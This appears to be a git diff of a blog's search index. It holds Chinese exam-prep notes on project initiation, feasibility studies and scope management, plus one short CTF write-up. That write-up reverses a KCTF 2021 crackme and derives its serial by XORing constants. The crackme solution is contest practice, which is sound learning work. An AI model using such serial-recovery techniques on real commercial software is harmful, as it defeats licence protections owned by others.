-<li>项目论证与评估是项目立项前的最后一关，“先论证(评估)，后决策”是现代项目管理的一项基本原则。</li>
-<li>项目可行性研究报告的编制内容与项目建议书批复内容有重大变更的，应重新报批项目建议书。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有重大变更或变更投资<font color="red">超出已批复总投资额度10%的</font>，应重新报批可行性研究报告。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有少量调整且其调整内容未超出已批复总投资额度10%的，需在提交项目初步设计方案和投资概算报告时<font color="red">以独立章节对调整部分进行定量补充说明</font>。</li>
-<li>3、项目识别是承建方项目立项的第一步，其目的在于选择投资机会、鉴别投资方向。从政策导向中寻找项目机会、从市场需求中寻找项目机会、从技术发展中寻找项目机会。承建方的项目立顶注意表现在:我公司人员是否满足要求，技术水平是否足够、竞争对手如何、是否赚钱。<br>项目机会选择主要渠道包括：(1)国家政策，产业导向；(2)市场需求；(3)技术发展；(4)特定事件。</li>
-</ol>
+    <title>身在何处wp</title>
+    <url>/2021/11/15/%E8%BA%AB%E5%9C%A8%E4%BD%95%E5%A4%84wp/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来自于<a href="https://ctf.pediy.com/game-team_list-15-21.htm">看雪CTF (pediy.com)</a></p>
+<p>原题下载链接：<a href="https://pan.lanzoui.com/ip5mnwj2nlc?w">kctf2021.rar - 蓝奏云 (lanzoui.com)</a></p>
+<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>通过字符串Success!直接定位到关键函数</p>
+<blockquote>
+<p>关键点在于第二次f_generate生成的字符串要与0x1388C77相等</p>
+<p>f_generate生成值与传入的参数有关，相同参数返回相同结果</p>
+<p><img src="https://i.loli.net/2021/11/15/aBHn3JOLhvTYldA.png" alt="func.png"></p>
+</blockquote>
+<p>f_generate分成两个部分</p>
+<blockquote>
+<p>第一部分与参数无关，通过循环加异或生成一个固定字符串0x2D02EF80</p>
+<p>再与传入的字符串参数作用生成j，最后取~j作为返回值</p>
+<p><img src="https://i.loli.net/2021/11/15/zbsx4K9vTf8VkBW.png" alt="func2.png"></p>
+</blockquote>
+<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>因为最后只要将序列号和由用户名生成的随机数进行异或，得到的值再传入f_generate能生成0x13B88C77即可，所以直接获取题目中包含的用户名和序列号，得到第二次传入的值0x52A1ED5A</p>
+<p><img src="https://i.loli.net/2021/11/15/xiA51tBo9U2dKTW.png" alt="number.png"></p>
+<p>即需满足：0x5EE54F4C ^ serial = 0x52A1ED5A<br>serial = 0x5EE54F4C^0x52A1ED5A=’205824534’ (转成10进制字符串)</p>
 ]]></content>
       <categories>
-        <category>软考</category>
+        <category>CTF</category>
+        <category>kctf2021</category>
       </categories>
+      <tags>
+        <tag>kctf2021</tag>
+      </tags>
   </entry>
   <entry>
     <title>项目整体管理</title>
@@ -1808,6 +1680,398 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
 <li><p>编制项目计划所遵循的基本原则有：</p>
 <p>目标的统一管理、方案的统一管理、过程的统一管理、技术工作与管理工作的统一协调、计划的统一管理、人员资源的统一管理、<font color="red">各干系人的参与、逐步精确</font>。</p>
 </li>
+</ol>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+      <tags>
+        <tag>Textual Criticism</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>项目立项管理</title>
+    <url>/2022/03/30/%E9%A1%B9%E7%9B%AE%E7%AB%8B%E9%A1%B9%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h3 id="立项管理内容"><a href="#立项管理内容" class="headerlink" title="立项管理内容"></a>立项管理内容</h3><p>&emsp;&emsp;项目立项一般包括提交<strong>项目建议书、项目可行性研究、项目招标与投标</strong>等内容。</p>
+<h4 id="项目建议书"><a href="#项目建议书" class="headerlink" title="项目建议书"></a>项目建议书</h4><p>&emsp;&emsp;<font color="red">项目建议书（又称立项申请）是<strong>项目建设单位</strong>向<strong>上级主管部门</strong>提交项目申请时所必须的文件，是对拟建项目提出的框架性的总体设想。在项目建议书批准后， 方可开展对外工作。</font></p>
+<font color="red">(选择题)项目建议书应该包括的核心内容如下:</font>
+
+<ol>
+<li><font color="red">项目的必要性。</font></li>
+<li><font color="red">项目的市场预测。</font></li>
+<li><font color="red">产品方案或服务的市场预测。</font></li>
+<li><font color="red">项目建设必需的条件。</font>
+
+</li>
+</ol>
+<h4 id="项目可行性研究报告"><a href="#项目可行性研究报告" class="headerlink" title="项目可行性研究报告"></a>项目可行性研究报告</h4><p>&emsp;&emsp;可行性研究具有预见性、公正性、可靠性、科学性的特点。</p>
+<font color="red">可行性研究内容一般包含如下内容：</font>
+
+<ol>
+<li><font color="red">投资必要性</font></li>
+<li><font color="red">技术的可行性</font></li>
+<li><font color="red">财务可行性</font></li>
+<li><font color="red">组织可行性</font></li>
+<li><font color="red">经济可行性</font></li>
+<li><font color="red">社会可行性</font></li>
+<li><font color="red">风险因素及对策</font>
+
+</li>
+</ol>
+<h4 id="项目招投标"><a href="#项目招投标" class="headerlink" title="项目招投标"></a>项目招投标</h4><p>（会有专门的课程讲法规）</p>
+<p>&emsp;&emsp;为防止投标人在投标后撤标或在中标后拒不签订合同，招标人通常都要求投标人提供—定比例或金额的投标保证金。招标人决定中标人后，未中标的投标人已缴纳的保证金即予退还。</p>
+<p>&emsp;&emsp;如果以邮寄方式送达的，投标人必须留出邮寄时间，保证投标文件能够在截止日期之前送达招标人指定的地点，而不是以 “ 邮戳为准＂。在截止时间后送达的投标文件，即已经过了招标有效期的，招标人应当原封退回，不得进入开标阶段。</p>
+<h3 id="可行性研究"><a href="#可行性研究" class="headerlink" title="可行性研究"></a>可行性研究</h3><h4 id="可行性研究的内容"><a href="#可行性研究的内容" class="headerlink" title="可行性研究的内容"></a>可行性研究的内容</h4><h5 id="技术可行性分析"><a href="#技术可行性分析" class="headerlink" title="技术可行性分析"></a>技术可行性分析</h5><font color="red">技术可行性分析—般应当考虑以下因素。</font>
+
+<ol>
+<li><font color="red">进行项目开发的风险。在给定的限制范围和时间期限内，能否设计出预期的系统并实现必须的功能和性能。</font></li>
+<li><font color="red">人力资源的有效性。可以用于项目开发的**技术人员**队伍是否可以建立， 是否存在人力资源不足、技术能力欠缺等问题， 是否可以在市场上或者通过培训获得所需要的**熟练技术人员**。</font></li>
+<li><font color="red">技术能力的可能性。相关技术的发展趋势和当前所掌握的技术是否支持该项目的开发， 市场上是否存在支持该技术的开发环境、平台和工具。</font></li>
+<li><font color="red">物资（产品）的可用性。是否存在可以用于建立系统的其他资源，如—些设备以及可行的替代产品等。</font>
+
+</li>
+</ol>
+<h5 id="经济可行性分析"><a href="#经济可行性分析" class="headerlink" title="经济可行性分析"></a>经济可行性分析</h5><font color="red">经济可行性分析具体包括支出分析、收益分析、投资回报分析以及敏感性分析等：</font>
+
+<ol>
+<li><font color="red">支出分析：信息系统项目的支出可以分为一次性支出和非一次性支出两类。</font></li>
+<li><font color="red">收益分析： 信息系统项目的收益包括直接收益、间接收益以及其他方面的收益等。</font></li>
+<li><font color="red">收益投资比、投资回收期分析： 对投入产出进行对比分析， 以确定项目的收益率和投资回收期等经济指标。（之后会学计算题）</font></li>
+<li><font color="red">敏感性分析：当诸如设备和软件配置、处理速度要求、系统的工作负荷类型和负荷量等关键性因素变化时，对支出和收益产生影响的估计。</font>
+
+</li>
+</ol>
+<p>&emsp;&emsp;除了上述的经济方面的分析外，一般还需要对项目的社会效益进行分析。例如，通过项目的实施，可以在管理水平、技术手段、人员素质等方面获得潜在的效益。</p>
+<h5 id="运行环境可行性分析"><a href="#运行环境可行性分析" class="headerlink" title="运行环境可行性分析"></a>运行环境可行性分析</h5><p>&emsp;&emsp;运行环境是制约信息系统在用户单位发挥效益的关键。因此，需要从用户单位（企业）的管理体制、管理方法、规章制度、工作习惯、人员素质（甚至包括人员的心理承受能力、接受新知识和技能的积极性等）、数据资源积累、硬件（包含系统软件）平台等多方面进行评估， 以确定软件系统在交付以后， 是否能够在用户单位顺利运行。</p>
+<h5 id="其他方面的可行性分析"><a href="#其他方面的可行性分析" class="headerlink" title="其他方面的可行性分析"></a>其他方面的可行性分析</h5><p>&emsp;&emsp;信息系统项目的可行性研究除了前面介绍的技术、经济和运行环境可行性分析外，还包括了诸如<strong>法律可行性、社会可行性</strong>等方面的可行性分析。</p>
+<h4 id="可行性研究的步骤"><a href="#可行性研究的步骤" class="headerlink" title="可行性研究的步骤"></a>可行性研究的步骤</h4><p>&emsp;&emsp;<font color="red">—般地，可行性研究分为初步可行性研究、详细可行性研究、可行性研究报告三个基本的阶段</font></p>
+<p>&emsp;&emsp;（不要求会）可行性研究可以归纳成几个基本步骤：</p>
+<pre><code>(1)确定项目规模和目标。
+(2)研究正在运行的系统。
+(3)建立新系统的逻辑模型。
+(4)导出和评价各种方案。
+(5)推荐可行性方案。
+(6)编写可行性研究报告。
+(7)递交可行性研究报告。
+</code></pre><h4 id="初步可行性研究"><a href="#初步可行性研究" class="headerlink" title="初步可行性研究"></a>初步可行性研究</h4><h5 id="初步可行性研究的定义及目的"><a href="#初步可行性研究的定义及目的" class="headerlink" title="初步可行性研究的定义及目的"></a>初步可行性研究的定义及目的</h5><p>&emsp;&emsp;初步可行性研究—般是在对市场或者客户情况进行调查后， 对项目进行的初步评估。</p>
+<p>&emsp;&emsp;详细可行性研究需要对项目在技术、经济、社会、运行环境、法律等方面进行深入的调查研究和分析， 是一项费时、费力的工作， 特别是大型的或比较复杂的项目更是如此。</p>
+<p>&emsp;&emsp;进行初步可行性评估， 可以从几个方面进行衡量， 以便决定是否开始详细可行性研究：</p>
+<pre><code>(1)分析项目的前途，从而决定是否应该继续深入调查研究。
+(2)初步估计和确定项目中的关键技术及核心问题，以确定是否需要解决。
+(3)初步估计必须进行的辅助研究， 以解决项目的核心间题， 并判断是否具备必要的技术、实验、人力条件作为支持。
+</code></pre><p>&emsp;&emsp;<font color="red">经过初步可行性研究， 可以形成<strong>初步可行性研究报告</strong></font></p>
+<h5 id="初步可行性研究的结果及作用"><a href="#初步可行性研究的结果及作用" class="headerlink" title="初步可行性研究的结果及作用"></a>初步可行性研究的结果及作用</h5><p>&emsp;&emsp;<font color="red">初步项目可行性研究的内容与详细的项目可行性研究基本相同，</font>要包括以下内容：市场情况、信息系统设计开发能力、配件、网络物理布局、技术和设备选择、网络安装工程、企业管理费、人力资源、项目实施及经济评价。</p>
+<p>&emsp;&emsp;<font color="red">在初步项目可行性研究之前可进行项目机会研究， 如果就投资可能性已进行了项目机会研究， 那么项目的初步可行性研究阶段往往可以省去。</font></p>
+<h5 id="辅助（功能）研究"><a href="#辅助（功能）研究" class="headerlink" title="辅助（功能）研究"></a>辅助（功能）研究</h5><p>&emsp;&emsp;<font color="red">辅助（功能）研究包括项目的一个或几个方面， 但不是所有方面</font></p>
+<h4 id="详细可行性研究"><a href="#详细可行性研究" class="headerlink" title="详细可行性研究"></a>详细可行性研究</h4><p>&emsp;&emsp;<strong>机会研究、 初步可行性研究、 详细可行性研究、 评估与决策</strong>是投资前时期的四个阶段。 在实际工作中， 前三个阶段依项目的规模和繁简程度可把前两个阶段省略或合二为—，但详细可行性研究是不可缺少的。 升级改造项目只做初步和详细研究， 小项目一般只进行详细可行性研究。</p>
+<h5 id="详细可行性研究的原则与程序框架"><a href="#详细可行性研究的原则与程序框架" class="headerlink" title="详细可行性研究的原则与程序框架"></a>详细可行性研究的原则与程序框架</h5><p>&emsp;&emsp;（可以不看）详细可行性研究的基本原则：</p>
+<pre><code>(1)科学性原则。
+(2)客观性原则。
+(3)公正性原则。
+</code></pre><h5 id="详细可行性研究的方法"><a href="#详细可行性研究的方法" class="headerlink" title="详细可行性研究的方法"></a>详细可行性研究的方法</h5><p>&emsp;&emsp;（可以不看，只需了解是详细可行性研究的方法即可）可行性研究的方法很多， 如经济评价法、市场预测法、投资估算法和增量净效益法等。</p>
+<p>&emsp;&emsp;增量净效益法(有无比较法)：将有项目时的成本（效益）与无项目时的成本（效益）进行比较， 求得两者差额，即为增量成本（效益）， 这种方法称之为有无比较法。</p>
+<h5 id="详细可行性研究的内容"><a href="#详细可行性研究的内容" class="headerlink" title="详细可行性研究的内容"></a>详细可行性研究的内容</h5><font color="red">信息系统项目详细可行性研究的内容，一般可以归纳如下（常给出几点考缺少哪点，大概率是缺钱相关的）：</font>
+
+<ol>
+<li><font color="red">概述</font>：提出项目开发的背景、必要性和经济意义， 研究项目工作的依据和范围，产品交付的形式、种类、数量。</li>
+<li><font color="red">需求确定</font>： 调查研究国内外客户的需求情况， 对国内外的技术趋势进行分析，确定项目的规模、目标、产品、方案和发展方向。</li>
+<li><font color="red">现有资源、设施情况分析</font>： 调查现有的资源（包括硬件设备、软件系统、数据、规章制度等种类与数量， 以及这些资源的使用情况和可能的更新情况）。</li>
+<li><font color="red">设计（初步）技术方案</font>： 确定项目的总体和详细目标、范围， 总体的结构和组成， 核心技术和关键问题、产品的功能与性能。</li>
+<li><font color="red">项目实施进度计划建议</font>。</li>
+<li><font color="red"><strong>投资估算和资金筹措计划</strong></font>。</li>
+<li><font color="red">项目组织、人力资源、技术培训计划</font>： 包括现有的人员规模、组织结构、人员层次、个人技术能力、人员技术培训计划等。</li>
+<li><font color="red"><strong>经济和社会效益分析（效果评价）</strong></font>。</li>
+<li><font color="red">合作／协作方式</font>。</li>
+</ol>
+<h4 id="效益的预测与评估"><a href="#效益的预测与评估" class="headerlink" title="效益的预测与评估"></a>效益的预测与评估</h4><p>&emsp;&emsp;对于效益的量化及计算方法有函数求解法、相关关系法、模糊数学法、专家意见法（德尔菲法）、成本降低法、利润增加发</p>
+<h3 id="项目评估与论证"><a href="#项目评估与论证" class="headerlink" title="项目评估与论证"></a>项目评估与论证</h3><h4 id="项目论证"><a href="#项目论证" class="headerlink" title="项目论证"></a>项目论证</h4><h5 id="项目论证的概念"><a href="#项目论证的概念" class="headerlink" title="项目论证的概念"></a>项目论证的概念</h5><p>&emsp;&emsp;项目论证是指对拟实施项目技术上的先进性、适用性， 经济上的合理性、盈利性， 实施上的可能性、风险性进行全面科学的综合分析， 为项目决策提供客观依据的一种技术经济研究活动。</p>
+<h5 id="项目论证的作用"><a href="#项目论证的作用" class="headerlink" title="项目论证的作用"></a>项目论证的作用</h5><font color="red">项目前评价的作用主要体现在以下几个方面：</font>
+
+<ol>
+<li><font color="red">项目论证是确定项目是否实施的依据。</font></li>
+<li><font color="red">项目论证是筹措资金、向银行贷款的依据。</font></li>
+<li><font color="red">项目论证是编制计划、设计、采购、施工以及机构设备、资源配置的依据。</font></li>
+<li><font color="red">项目论证是防范风险、提高项目效率的重要保证。</font>
+
+</li>
+</ol>
+<h5 id="项目论证的阶段划分"><a href="#项目论证的阶段划分" class="headerlink" title="项目论证的阶段划分"></a>项目论证的阶段划分</h5><p>项目论证一般分为机会研究、初步可行性研究和详细可行性研究三个阶段。</p>
+<p><img src="https://s2.loli.net/2022/03/30/D6B7XKoJabm8OHy.png" alt="image-20220330143617293"></p>
+<h5 id="项目论证的一般程序"><a href="#项目论证的一般程序" class="headerlink" title="项目论证的一般程序"></a>项目论证的一般程序</h5><p>（只考过一次，可以不看，看的话提取关键字记住顺序）项目论证的一般程序，一般有以下七个主要步骤：</p>
+<pre><code>(1) 明确项目范围和业主目标。
+(2) 收集并分析相关资料。
+(3) 拟定多种可行的能够相互替代的实施方案。
+(4) 多方案分析、比较。
+(5) 选择最优方案进一步详细全面地论证
+(6) 编制项目论证报告、环境影响报告书和采购方式审批报告。
+(7) 编制资金筹措计划和项目实施进度计划。
+</code></pre><h5 id="项目评估"><a href="#项目评估" class="headerlink" title="项目评估"></a>项目评估</h5><h5 id="项目评估的含义及其依据"><a href="#项目评估的含义及其依据" class="headerlink" title="项目评估的含义及其依据"></a>项目评估的含义及其依据</h5><p>&emsp;&emsp;项目评估指在项目可行性研究的基础上， 由<font color="red">第三方（国家、银行或有关机构）</font>根据国家颁布的政策、 法规、 方法、 参数和条例等， 从项目（或企业）、国民经济、社会角度出发，对拟建项目建设的必要性、建设条件、生产条件、产品市场需求、工程技术、经济效益和社会效益等进行评价、 分析和论证，进而判断其是否可行的一个评估过程。项目评估是项目投资前期进行决策管理的重要环节，<font color="red">其目的是审查项目可行性研究的可靠性真实性和客观性，为银行的贷款决策或行政主管部门的审批决策提供科学依据。</font></p>
+<font color="red">项目评估的最终成果是项目评估报告。</font>
+
+<p>&emsp;&emsp;项目评估的依据包括如下项目:</p>
+<pre><code>项目建议书及其批准文件。
+项目可行性研究报告。
+报送单位的申请报告及主管部门的初审意见。
+有关资源、配件、燃料、水、电、交通、通信、资金（包括外汇）等方面的协议文件。
+必需的其他文件和资料。
+</code></pre><h3 id="补充考点："><a href="#补充考点：" class="headerlink" title="补充考点："></a>补充考点：</h3><ol>
+<li>项目论证与评估是项目立项前的最后一关，“先论证(评估)，后决策”是现代项目管理的一项基本原则。</li>
+<li>项目可行性研究报告的编制内容与项目建议书批复内容有重大变更的，应重新报批项目建议书。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有重大变更或变更投资<font color="red">超出已批复总投资额度10%的</font>，应重新报批可行性研究报告。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有少量调整且其调整内容未超出已批复总投资额度10%的，需在提交项目初步设计方案和投资概算报告时<font color="red">以独立章节对调整部分进行定量补充说明</font>。</li>
+<li>3、项目识别是承建方项目立项的第一步，其目的在于选择投资机会、鉴别投资方向。从政策导向中寻找项目机会、从市场需求中寻找项目机会、从技术发展中寻找项目机会。承建方的项目立顶注意表现在:我公司人员是否满足要求，技术水平是否足够、竞争对手如何、是否赚钱。<br>项目机会选择主要渠道包括：(1)国家政策，产业导向；(2)市场需求；(3)技术发展；(4)特定事件。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>项目范围管理</title>
+    <url>/2022/03/31/%E9%A1%B9%E7%9B%AE%E8%8C%83%E5%9B%B4%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<font color="red">### 10大管理学习主线</font>
+
+<ol>
+<li><font color="red">每个管理领域有哪些过程？</font></li>
+<li><font color="red">每个过程的输入（做XX的依据）、输出（做XX的结果）、工具和技术（用XX方法和工具）是什么？</font></li>
+<li><font color="red">每个管理领域有什么问题，应该怎么解决？</font></li>
+<li><font color="red">每个管理领域和其余管理领域的关系是什么？</font>
+
+</li>
+</ol>
+<font color="red">凡是监控过程，输入一定包含计划和绩效，结果必定包含变更和更新</font>
+
+<font color="red">凡XX管理必定输出XX管理计划，作用是为管理XX提供指南和方向</font>
+
+<font color="red">编写XX计划的工具和技术一定有专家判断和会议</font>
+
+<h3 id="范围管理概述"><a href="#范围管理概述" class="headerlink" title="范围管理概述"></a>范围管理概述</h3><p>&emsp;&emsp;项目范围管理需要做以下三个方面的工作：</p>
+<pre><code>(1)明确项目边界，即明确哪些工作是包括在项目范围之内的，哪些工作是不包括在项目范围之内的。
+(2)对项目执行工作进行监控，确保所有该做的工作都做了，而且没有多做。对不包括在项目范围内的额外工作说 “不“， 杜绝做额外工作。
+(3)防止项目范围发生蔓延。范围蔓延是指未对时间、成本和资源做相应调整，未经控制的产品或项目范围的扩大。
+</code></pre><h4 id="产品范围与项目范围"><a href="#产品范围与项目范围" class="headerlink" title="产品范围与项目范围"></a>产品范围与项目范围</h4><p>&emsp;&emsp;产品范围是指产品或者服务所应该包含的功能<strong>（技术主线）</strong>， 项目范围是指为了能够交付产品，项目所必须做的工作<strong>（管理主线）</strong>。</p>
+<p>&emsp;&emsp;产品范围是项目范围的基础， 产品范围的定义是产品要求的描述， 而项目范围的定义是产生项目管理计划的基础</p>
+<p>&emsp;&emsp;<font color="red">项目的范围基准(Scope Baseline)是<strong>经过批准的</strong>项目范围说明书、WBS(Work Breakdown Structure)和WBS词典。</font>判断项目范围是否完成， 要以范围基准来衡量。而产品范围是否完成， 则根据产品是否满足了产品描述来判断。</p>
+<p>&emsp;&emsp;产品范围描述是项目范围说明书的重要组成部分， 因此， 产品范围变更后， 首先受到影响的是项目的范围。</p>
+<h4 id="范围管理的重要性"><a href="#范围管理的重要性" class="headerlink" title="范围管理的重要性"></a>范围管理的重要性</h4><p>无重要考点</p>
+<h4 id="范围管理的过程"><a href="#范围管理的过程" class="headerlink" title="范围管理的过程"></a>范围管理的过程</h4><p>&emsp;&emsp;项目范围管理主要是通过<font color="red"><strong>规划范围管理、收集需求、定义范围、创建WBS、 确认范围和控制范围</strong></font>六个过程来实现的。 </p>
+<p><img src="https://s2.loli.net/2022/03/31/xUKpGosDPrgZuHd.png" alt="image-20220331134553187"></p>
+<p><img src="https://s2.loli.net/2022/03/31/VZBlMpG2ejQxotb.png" alt="image-20220331134618528"></p>
+<h3 id="规划范围管理（过程一）"><a href="#规划范围管理（过程一）" class="headerlink" title="规划范围管理（过程一）"></a>规划范围管理（过程一）</h3><p>&emsp;&emsp;规划范围管理(Plan Scope Management)是<font color="red"><strong>编制范围管理计划</strong></font>， 书面描述将如何定义、 确认和控制项目范围的过程， <font color="red"><strong>其主要作用是在整个项目中对如何管理范围提供指南和方向</strong>。</font></p>
+<p>&emsp;&emsp;规划范围管理过程的输入有<font color="red"><strong>项目管理计划、项目章程</strong></font>、<strong>事业环境因素和组织过程资产</strong>， 使用的工具与技术有<strong>专家判断和会议</strong>， 输出有<font color="red"><strong>范围管理计划和需求管理计划</strong></font>。本节主要简单介绍范围管理计划和需求管理计划。</p>
+<h4 id="范围管理计划"><a href="#范围管理计划" class="headerlink" title="范围管理计划"></a>范围管理计划</h4><font color="red">范围管理计划是制订项目管理计划过程和其他范围管理过程的主要输入， 要对将用于下列工作的管理过程做出规定：</font>
+
+<ul>
+<li><font color="red">如何制订项目范围说明书。</font></li>
+<li><font color="red">如何根据范围说明书创建WBS。</font></li>
+<li><font color="red">如何维护和批准WBS。</font></li>
+<li><font color="red">如何确认和正式验收已完成的项目可交付成果。</font></li>
+<li><font color="red">如何处理项目范围说明书的变更， 该工作与实施整体变更控制过程直接相联。</font>
+
+</li>
+</ul>
+<p>&emsp;&emsp;<strong>项目范围管理计划（同其他管理计划）</strong>可能在项目管理计划之中，也可能作为单独的一项。根据不同的项目，可以是详细的或者概括的， 可以是正式的或者非正式的。</p>
+<h4 id="需求管理计划"><a href="#需求管理计划" class="headerlink" title="需求管理计划"></a>需求管理计划</h4><p>&emsp;&emsp;需求管理贯穿于整个过程， 它的最基本的任务就是<strong>明确需求</strong>， 并使项目团队和用户<strong>达成共识</strong>， 即建立需求基线。另外， 还要<strong>建立需求跟踪能力联系链</strong>，确保所有用户需求都被正确地应用， 并且在需求发生变更时， 能够完全地控制其影响范围， 始终保持产品与需求的一致性。</p>
+<p>需求管理计划主要包括以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1)如何规划、跟踪和汇报各种需求活动</span><br><span class="line">(2)需求管理需要使用的资源。</span><br><span class="line">(3)培训计划。</span><br><span class="line">(4)项目干系人参与需求管理的策略。</span><br><span class="line">(5)判断项目范围与需求不一致的准则和纠正规程。</span><br><span class="line">(6)需求跟踪结构</span><br><span class="line">(7)配置管理活动</span><br></pre></td></tr></table></figure>
+<h3 id="收集需求（过程二）"><a href="#收集需求（过程二）" class="headerlink" title="收集需求（过程二）"></a>收集需求（过程二）</h3><h4 id="需求的分类"><a href="#需求的分类" class="headerlink" title="需求的分类"></a>需求的分类</h4><font color="red">(1) 业务需求：整个组织的高层级需要， 例如， 解决业务间题或抓住业务机会，以及实施项目的原因。</font>
+<font color="red">(2)干系人需求：是指干系人或干系人群体的需要。</font>
+(3)解决方案需求： 是为满足业务需求和干系人需求， 产品、服务或成果必须具备的特性、功能和特征。解决方案需求又进一步分为功能需求和非功能需求。
+(4)过渡需求： 从当前状态过渡到将来状态所需的临时能力， 例如， 数据转换和培训需求。
+(5)项目需求： 项目需要满足的行动、过程或其他条件。
+<font color="red">(6)质量需求： 用于确认项目可交付成果的成功完成或其他项目需求的实现的任何条件或标准。QFD对质量需求进行了细分， 分为**基本需求、期望需求和意外需求**。</font>
+
+<h4 id="收集需求的工具与技术"><a href="#收集需求的工具与技术" class="headerlink" title="收集需求的工具与技术"></a>收集需求的工具与技术</h4><p>&emsp;&emsp;<font color="red">收集需求的工具与技术主要有访谈、焦点小组、引导式研讨会、群体创新技术、群体决策技术、问卷调查、观察、原型法、标杆对照、系统交互图、文件分析等。</font></p>
+<h5 id="焦点小组"><a href="#焦点小组" class="headerlink" title="焦点小组"></a>焦点小组</h5><p>&emsp;&emsp;<font color="red">焦点小组将<strong>预先选定的干系人和主题专家</strong>集中在—起， 了解他们对所提议产品、服务或成果的期望和态度。由一位受过训练的主持人引导大家进行互动式讨论。焦点小组往往比一对—的访谈更加热烈。</font><br>&emsp;&emsp;<font color="red">焦点小组是—种群体访谈而非一对一访谈， 可以有6~10个被访谈者参加。针对访谈者提出的问题， 被访谈者之间开展互动式讨论， 以求得到更有价值的意见。</font></p>
+<h5 id="引导式研讨会"><a href="#引导式研讨会" class="headerlink" title="引导式研讨会"></a>引导式研讨会</h5><p>&emsp;&emsp;<font color="red">通过邀请<strong>主要的跨职能干系人</strong>一起参加会议， 引导式研讨会(Facilitated Workshop)对产品需求进行集中讨论与定义。研讨会是快速定义跨职能需求和协调干系人差异的重要技术。由于群体互动的特点， 被有效引导的研讨会有助于建立信任、促进关系、改善沟通， 从而有利于参加者达成一致意见。该技术的另—个好处是， 能够比单项会议更快地发现和解决问题。</font></p>
+<h5 id="群体创新技术"><a href="#群体创新技术" class="headerlink" title="群体创新技术"></a>群体创新技术</h5><p>&emsp;&emsp;<font color="red">群体创新技术(Group Creativity Technique)是指可以组织一些群体活动来识别项目和产品需求， 群体创新技术包括头脑风暴法、名义小组技术、德尔菲技术、概念／思维导图、亲和图和多标准决策分析等。</font></p>
+<ul>
+<li><font color="red">头脑风暴(Brain Storming, BS)法又称为智力激励法、自由思考法或集思广益法：各抒己见</font>
+</li>
+<li><font color="red">名义小组技术(Nominal Group Technique)**通过投票来排列最有用的创意**， 以便进行进—步的头脑风暴或优先排序。名义小组技术是头脑风暴法的深化应用， 是更加结构化的头脑风暴法</font>
+</li>
+<li><font color="red">德尔菲技术(Delphi Technique)：防止个人的观点被不正确的放大</font>
+</li>
+<li><font color="red">思维导图(Mind Mapping)又称为心智图， 是将从头脑风暴中获得的创意， 用一张简单的图联系起来， 以反映这些创意之间的共性与差异， 从而引导出新的创意。</font>
+</li>
+<li><font color="red">亲和图(Affinity Diagram)又称为KJ法， 是针对某一间题， 充分收集各种经验、知识、想法和意见等语言、文字资料， 通过图解方式进行汇总， 并按其相互亲和性归纳整理这些资料， 使间题明确起来， 求得统—认识， 以利千解决的—种方法。</font>
+
+<font color="red">亲和图的核心是头脑风暴法， 是根据结果去找原因。</font>
+</li>
+<li><font color="red">多标准决策分析(Multi-Criteria Decision Analysis)是借助决策矩阵， 用系统分析方法建立诸如风险水平、不确定性和价值收益**等多种标准**， 从而对众多方案进行评估和排序的一种技术。</font>
+
+</li>
+</ul>
+<h5 id="群体决策"><a href="#群体决策" class="headerlink" title="群体决策"></a>群体决策</h5><p>&emsp;&emsp;<font color="red">群体决策(Group Decision-Making)就是为达成某种期望结果而对多个未来行动方案进行评估：</font></p>
+<ul>
+<li><font color="red">—致同意(Unanimity)。所有人都同意某个行动方案。</font></li>
+<li><font color="red">大多数原则(Majority)。获得群体中50％以上的人的支持， 就能做出决策。参与决策的人数定为奇数， 防止因平局而无法达成决策。</font></li>
+<li><font color="red">相对多数原则(Plurality)。根据群体中相对多数者的意见做出决定， 即便未能获得一部分人的支持。通常在候选项超过两个时使用该原则， 例如， 某个软件构件的功能有3种实现方案（标记为A、B、C) ， 在群体决策时， 同意A方案的人有40%， 同意B方案的人有35%， 同意C方案的人有25%， 则最终确定采用A方案。</font></li>
+<li><font color="red">独裁(Dictatorship)。由某一个人（例如， 项目经理）为群体做出决策。</font>
+
+</li>
+</ul>
+<h5 id="原型法"><a href="#原型法" class="headerlink" title="原型法"></a>原型法</h5><p>&emsp;&emsp;<font color="red">原型法(Prototype) 是一种根据干系人初步需求， 利用产品开发工具， 快速地建立一个产品模型展示给干系人， 在此基础上与干系人交流， 最终实现干系人需求的产品快速开发的方法。</font></p>
+<h5 id="标杆对照"><a href="#标杆对照" class="headerlink" title="标杆对照"></a>标杆对照</h5><p>&emsp;&emsp;<font color="red">标杆对照(Benchmarking)将实际或计划的做法与<strong>其他类似组织</strong>的做法（例如， 流程、操作过程等）进行比较， 以便识别最佳实践， 形成改进意见， 并为绩效考核提供依据。标杆对照所采用的＂类似组织” 可以是内部组织， 也可以是外部组织。</font></p>
+<h5 id="系统交互图"><a href="#系统交互图" class="headerlink" title="系统交互图"></a>系统交互图</h5><p>&emsp;&emsp;<font color="red">系统交互图(ContextDiagram)是范围模型的一个例子， 它是对产品范围的可视化描述， 显示系统（过程、设备、信息系统等）与参与者（用户、独立于本系统之外的其他系统）之间的交互方式。系统交互图显示了业务系统的输入、输入提供者、业务系统的输出和输出接收者</font></p>
+<h5 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h5><p>&emsp;&emsp;<font color="red">文件分析(Document Analysis)就是通过分析现有文档，识别与需求相关的信息来挖掘需求。可供分析的文档很多，包括商业计划、营销文档、协议、招投标文件、建议邀请书、业务流程、逻辑数据模型、业务规则库、应用软件文档、用例文档、其他需求文档、间题日志、政策、程序和法规文件等。</font></p>
